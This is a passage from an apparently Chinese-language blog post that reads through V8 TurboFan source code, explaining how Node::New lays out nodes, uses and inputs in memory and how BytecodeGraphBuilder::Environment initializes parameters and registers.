class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Initialize the input pointers and the uses.</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> current = <span class="number">0</span>; current &lt; input_count; ++current) &#123;</span><br><span class="line">    Node* to = *inputs++;</span><br><span class="line">    input_ptr[current] = to;</span><br><span class="line">    Use* use = use_ptr - <span class="number">1</span> - current;</span><br><span class="line">    use-&gt;bit_field_ = Use::InputIndexField::encode(current) |</span><br><span class="line">                      Use::InlineField::encode(is_inline);</span><br><span class="line">    to-&gt;AppendUse(use);</span><br><span class="line">  &#125;</span><br><span class="line">  node-&gt;Verify();</span><br><span class="line">  <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先定义了几个局部变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Node** input_ptr;</span><br><span class="line">Use* use_ptr;</span><br><span class="line">Node* node;</span><br><span class="line"><span class="keyword">bool</span> is_inline;</span><br></pre></td></tr></table></figure><p><strong>然后判断input_count是否大于kMaxInineCapacity</strong><br>注意这里的input_count来自这里的nodes_arr.size()，此处对于start的情况，<code>NewNode(common()-&gt;Start(actual_parameter_count)));</code>，可以看出这个结果是0。<br>这是个比较特殊的情况，后面我们再分析几个node的生成看一下这个逻辑。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Node* <span class="title">NewNode</span><span class="params">(<span class="keyword">const</span> Operator* op, Nodes*... nodes)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">array</span>&lt;Node*, <span class="keyword">sizeof</span>...(nodes)&gt; nodes_arr&#123;&#123;nodes...&#125;&#125;;</span><br><span class="line">  <span class="keyword">return</span> NewNode(op, nodes_arr.<span class="built_in">size</span>(), nodes_arr.data());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么这里有这样的一个比较呢？是因为v8对node的存储决定的<br>从注释里可以找到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D; Memory layout &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;&#x2F; Saving space for big graphs is important. We use a memory layout trick to</span><br><span class="line">&#x2F;&#x2F; be able to map &#123;Node&#125; objects to &#123;Use&#125; objects and vice-versa in a</span><br><span class="line">&#x2F;&#x2F; space-efficient manner.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; &#123;Use&#125; links are laid out in memory directly before a &#123;Node&#125;, followed by</span><br><span class="line">&#x2F;&#x2F; direct pointers to input &#123;Nodes&#125;.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; inline case:</span><br><span class="line">&#x2F;&#x2F; |Use #N  |Use #N-1|...|Use #1  |Use #0  |Node xxxx |I#0|I#1|...|I#N-1|I#N|</span><br><span class="line">&#x2F;&#x2F;          ^                              ^                  ^</span><br><span class="line">&#x2F;&#x2F;          + Use                          + Node             + Input</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; Since every &#123;Use&#125; instance records its &#123;input_index&#125;, pointer arithmetic</span><br><span class="line">&#x2F;&#x2F; can compute the &#123;Node&#125;.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; out-of-line case:</span><br><span class="line">&#x2F;&#x2F;     |Node xxxx |</span><br><span class="line">&#x2F;&#x2F;     ^       + outline ------------------+</span><br><span class="line">&#x2F;&#x2F;     +----------------------------------------+</span><br><span class="line">&#x2F;&#x2F;                                         |    |</span><br><span class="line">&#x2F;&#x2F;                                         v    | node</span><br><span class="line">&#x2F;&#x2F; |Use #N  |Use #N-1|...|Use #1  |Use #0  |OOL xxxxx |I#0|I#1|...|I#N-1|I#N|</span><br><span class="line">&#x2F;&#x2F;          ^                                                 ^</span><br><span class="line">&#x2F;&#x2F;          + Use                                             + Input</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; Out-of-line storage of input lists is needed if appending an input to</span><br><span class="line">&#x2F;&#x2F; a node exceeds the maximum inline capacity.</span><br></pre></td></tr></table></figure><p>如果是小于kMaxInineCapacity，则可以直接将inputs内联在node中。<br>这里的计算方法是，首先计算capacity，默认应该是等于input_count，如果有<code>has_extensible_inputs</code>，则在input_count + 3和kMaxInlineCapacity选取一个最小值。<br><em>这个has_extensible_inputs我还不是很懂，后面看看吧</em></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> capacity = input_count;</span><br><span class="line">    <span class="keyword">if</span> (has_extensible_inputs) &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">int</span> <span class="built_in">max</span> = kMaxInlineCapacity;</span><br><span class="line">      capacity = <span class="built_in">std</span>::<span class="built_in">min</span>(input_count + <span class="number">3</span>, <span class="built_in">max</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后计算size大小，并为node和它的use/input分配内存。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> <span class="built_in">size</span> = <span class="keyword">sizeof</span>(Node) + capacity * (<span class="keyword">sizeof</span>(Node*) + <span class="keyword">sizeof</span>(Use));</span><br><span class="line"><span class="keyword">intptr_t</span> raw_buffer = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(zone-&gt;New(<span class="built_in">size</span>));</span><br><span class="line"><span class="keyword">void</span>* node_buffer =</span><br><span class="line">        <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span>*&gt;(raw_buffer + capacity * <span class="keyword">sizeof</span>(Use));</span><br></pre></td></tr></table></figure><p>顺便说一下，一个Use大小是24字节，一个Node是40字节</p><p>计算好size之后进入这个函数，在这生成新的node。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Node::Node(NodeId id, <span class="keyword">const</span> Operator* op, <span class="keyword">int</span> inline_count, <span class="keyword">int</span> inline_capacity)</span><br><span class="line">    : op_(op),</span><br><span class="line">      mark_(<span class="number">0</span>),</span><br><span class="line">      bit_field_(IdField::encode(id) | InlineCountField::encode(inline_count) |</span><br><span class="line">                 InlineCapacityField::encode(inline_capacity)),</span><br><span class="line">      first_use_(<span class="literal">nullptr</span>) &#123;</span><br><span class="line">  <span class="comment">// Inputs must either be out of line or within the inline capacity.</span></span><br><span class="line">  DCHECK_GE(kMaxInlineCapacity, inline_capacity);</span><br><span class="line">  DCHECK(inline_count == kOutlineMarker || inline_count &lt;= inline_capacity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后需要为这个node建立input/use关系,这里的逻辑就是，首先根据当前node的input_count数。<br>依次设置to为input节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> current = <span class="number">0</span>; current &lt; input_count; ++current) &#123;</span><br><span class="line">  Node* to = *inputs++;</span><br></pre></td></tr></table></figure><p>然后由于input_ptr指向node的inputs区域，在node的inputs区域记录它的input节点的地址。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">input_ptr = node-&gt;inputs_.inline_;</span><br><span class="line">...</span><br><span class="line">input_ptr[current] = to;</span><br></pre></td></tr></table></figure><p>通过这种方式就将节点的input关系建立好了。<br>然后需要考虑一下use关系，现在我们可以看到use_ptr指向的是当前node的地址。<br>通过use_ptr和{input_index}来计算出use，然后在use里记录当前{input_index}的值，于是我们可以通过这个值来做简单的算数计算来找到node。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Use* use = use_ptr - <span class="number">1</span> - current;</span><br><span class="line">use-&gt;bit_field_ = Use::InputIndexField::encode(current) |</span><br><span class="line">                      Use::InlineField::encode(is_inline);</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">to-&gt;AppendUse(use);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Node::AppendUse</span><span class="params">(Use* use)</span> </span>&#123;</span><br><span class="line">  DCHECK(first_use_ == <span class="literal">nullptr</span> || first_use_-&gt;prev == <span class="literal">nullptr</span>);</span><br><span class="line">  DCHECK_EQ(<span class="keyword">this</span>, *use-&gt;input_ptr());</span><br><span class="line">  use-&gt;next = first_use_;</span><br><span class="line">  use-&gt;prev = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (first_use_) first_use_-&gt;prev = use;</span><br><span class="line">  first_use_ = use;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是从当前节点的input节点到当前节点，这样的一个{input}-&gt;{node}的use关系就建立起来了。<br>注意first_use是Node结构的一个成员变量。</p><p>或许这么说还是有点难懂，其实就是假设有一个节点A，它有0，1，2，3这么几个input节点，0，1，2，3代表的也是input_index。<br>然后对于每一个它的input节点，都要从它的Use部分取一个分配给它的input，如图。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-05-122857.png" alt=""><br>然后因为分配出去的Use里面有记录这个input节点对应的input index，于是很容易就可以计算出来Node的地址。<br>这样，一个{input}-&gt;{node}的{Use #index}的关系就建立好了，而且很容易就可以通过#index来进行算数运算，得到真正的{input}-&gt;{node}，这样的use关系。</p><p><em>之所以需要这么麻烦，可能也是为了让graph IR有SSA的性质……</em></p><p>Node::New结束之后，此时Start节点已经被构建好了，请记住Node::New做的事情，因为后面建立新的node也是通过这个函数来完成的。</p><h4 id="BytecodeGraphBuilder-Environment"><a href="#BytecodeGraphBuilder-Environment" class="headerlink" title="BytecodeGraphBuilder::Environment"></a>BytecodeGraphBuilder::Environment</h4><p>回到<code>BytecodeGraphBuilder::CreateGraph()</code>来看一下，在Start创建之后，初始化env并切换到它。<br>在看env的初始化之前，先看一个重要的class</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The abstract execution environment simulates the content of the interpreter</span></span><br><span class="line"><span class="comment">// register file. The environment performs SSA-renaming of all tracked nodes at</span></span><br><span class="line"><span class="comment">// split and merge points in the control flow.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytecodeGraphBuilder</span>:</span>:Environment : <span class="keyword">public</span> ZoneObject &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  Environment(BytecodeGraphBuilder* builder, <span class="keyword">int</span> register_count,</span><br><span class="line">              <span class="keyword">int</span> parameter_count,</span><br><span class="line">              interpreter::Register incoming_new_target_or_generator,</span><br><span class="line">              Node* control_dependency);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Specifies whether environment binding methods should attach frame state</span></span><br><span class="line">  <span class="comment">// inputs to nodes representing the value being bound. This is done because</span></span><br><span class="line">  <span class="comment">// the &#123;OutputFrameStateCombine&#125; is closely related to the binding method.</span></span><br><span class="line">  <span class="keyword">enum</span> FrameStateAttachmentMode &#123; kAttachFrameState, kDontAttachFrameState &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">parameter_count</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> parameter_count_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">register_count</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> register_count_; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Node* <span class="title">LookupAccumulator</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">  <span class="function">Node* <span class="title">LookupRegister</span><span class="params">(interpreter::Register the_register)</span> <span class="keyword">const</span></span>;</span><br><span class="line">  <span class="function">Node* <span class="title">LookupGeneratorState</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">BindAccumulator</span><span class="params">(Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">                       FrameStateAttachmentMode mode = kDontAttachFrameState)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">BindRegister</span><span class="params">(interpreter::Register the_register, Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">                    FrameStateAttachmentMode mode = kDontAttachFrameState)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">BindRegistersToProjections</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      interpreter::Register first_reg, Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">      FrameStateAttachmentMode mode = kDontAttachFrameState)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">BindGeneratorState</span><span class="params">(Node* node)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">RecordAfterState</span><span class="params">(Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">                        FrameStateAttachmentMode mode = kDontAttachFrameState)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Effect dependency tracked by this environment.</span></span><br><span class="line">  <span class="function">Node* <span class="title">GetEffectDependency</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> effect_dependency_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">UpdateEffectDependency</span><span class="params">(Node* dependency)</span> </span>&#123;</span><br><span class="line">    effect_dependency_ = dependency;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Preserve a checkpoint of the environment for the IR graph. Any</span></span><br><span class="line">  <span class="comment">// further mutation of the environment will not affect checkpoints.</span></span><br><span class="line">  <span class="function">Node* <span class="title">Checkpoint</span><span class="params">(BailoutId bytecode_offset, OutputFrameStateCombine combine,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="keyword">const</span> BytecodeLivenessState* liveness)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Control dependency tracked by this environment.</span></span><br><span class="line">  <span class="function">Node* <span class="title">GetControlDependency</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> control_dependency_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">UpdateControlDependency</span><span class="params">(Node* dependency)</span> </span>&#123;</span><br><span class="line">    control_dependency_ = dependency;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Node* <span class="title">Context</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> context_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SetContext</span><span class="params">(Node* new_context)</span> </span>&#123; context_ = new_context; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Environment* <span class="title">Copy</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Merge</span><span class="params">(Environment* other, <span class="keyword">const</span> BytecodeLivenessState* liveness)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">FillWithOsrValues</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">PrepareForLoop</span><span class="params">(<span class="keyword">const</span> BytecodeLoopAssignments&amp; assignments,</span></span></span><br><span class="line"><span class="function"><span class="params">                      <span class="keyword">const</span> BytecodeLivenessState* liveness)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">PrepareForLoopExit</span><span class="params">(Node* loop,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">const</span> BytecodeLoopAssignments&amp; assignments,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">const</span> BytecodeLivenessState* liveness)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Environment</span><span class="params">(<span class="keyword">const</span> Environment* copy)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">StateValuesRequireUpdate</span><span class="params">(Node** state_values, Node** values, <span class="keyword">int</span> count)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">UpdateStateValues</span><span class="params">(Node** state_values, Node** values, <span class="keyword">int</span> count)</span></span>;</span><br><span class="line">  <span class="function">Node* <span class="title">GetStateValuesFromCache</span><span class="params">(Node** values, <span class="keyword">int</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">const</span> BitVector* liveness, <span class="keyword">int</span> liveness_offset)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">RegisterToValuesIndex</span><span class="params">(interpreter::Register the_register)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">Zone* <span class="title">zone</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> builder_-&gt;local_zone(); &#125;</span><br><span class="line">  <span class="function">Graph* <span class="title">graph</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> builder_-&gt;graph(); &#125;</span><br><span class="line">  <span class="function">CommonOperatorBuilder* <span class="title">common</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> builder_-&gt;common(); &#125;</span><br><span class="line">  <span class="function">BytecodeGraphBuilder* <span class="title">builder</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> builder_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> NodeVector* <span class="title">values</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> &amp;values_; &#125;</span><br><span class="line">  <span class="function">NodeVector* <span class="title">values</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> &amp;values_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">register_base</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> register_base_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">accumulator_base</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> accumulator_base_; &#125;</span><br><span class="line"></span><br><span class="line">  BytecodeGraphBuilder* builder_;</span><br><span class="line">  <span class="keyword">int</span> register_count_;</span><br><span class="line">  <span class="keyword">int</span> parameter_count_;</span><br><span class="line">  Node* context_;</span><br><span class="line">  Node* control_dependency_;</span><br><span class="line">  Node* effect_dependency_;</span><br><span class="line">  NodeVector values_;</span><br><span class="line">  Node* parameters_state_values_;</span><br><span class="line">  Node* generator_state_;</span><br><span class="line">  <span class="keyword">int</span> register_base_;</span><br><span class="line">  <span class="keyword">int</span> accumulator_base_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>从上面可知，values()返回一个NodeVector values_。<br>然后继续看env的初始化</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function">Environment <span class="title">env</span><span class="params">(<span class="keyword">this</span>, bytecode_array()-&gt;register_count(),</span></span></span><br><span class="line"><span class="function"><span class="params">                  bytecode_array()-&gt;parameter_count(),</span></span></span><br><span class="line"><span class="function"><span class="params">                  bytecode_array()-&gt;incoming_new_target_or_generator_register(),</span></span></span><br><span class="line"><span class="function"><span class="params">                  graph()-&gt;start())</span></span>;</span><br><span class="line">  set_environment(&amp;env);</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  BytecodeGraphBuilder::Environment::Environment(</span><br><span class="line">    BytecodeGraphBuilder* builder, <span class="keyword">int</span> register_count, <span class="keyword">int</span> parameter_count,</span><br><span class="line">    interpreter::Register incoming_new_target_or_generator,</span><br><span class="line">    Node* control_dependency)</span><br><span class="line">    : builder_(builder),</span><br><span class="line">      register_count_(register_count),</span><br><span class="line">      parameter_count_(parameter_count),</span><br><span class="line">      control_dependency_(control_dependency),</span><br><span class="line">      effect_dependency_(control_dependency),</span><br><span class="line">      values_(builder-&gt;local_zone()),</span><br><span class="line">      parameters_state_values_(<span class="literal">nullptr</span>),</span><br><span class="line">      generator_state_(<span class="literal">nullptr</span>) &#123;</span><br><span class="line">  <span class="comment">// The layout of values_ is:</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// [receiver] [parameters] [registers] [accumulator]</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// parameter[0] is the receiver (this), parameters 1..N are the</span></span><br><span class="line">  <span class="comment">// parameters supplied to the method (arg0..argN-1). The accumulator</span></span><br><span class="line">  <span class="comment">// is stored separately.</span></span><br><span class="line">  <span class="comment">// Parameters including the receiver</span></span><br><span class="line">....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意这句话</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parameter[0] is the receiver (this), parameters 1..N are the</span><br><span class="line">Parameters including the receiver</span><br></pre></td></tr></table></figure><p>首先创建parameter节点，Start作为parameter的input节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; parameter_count; i++) &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">const</span> Operator* op = common()-&gt;Parameter(i, debug_name);</span><br><span class="line">  Node* parameter = builder-&gt;graph()-&gt;NewNode(op, graph()-&gt;start());</span><br><span class="line">  values()-&gt;push_back(parameter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后向values_这个NodeVector的end之前，插入register_count个值为undefined_constant的Node节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 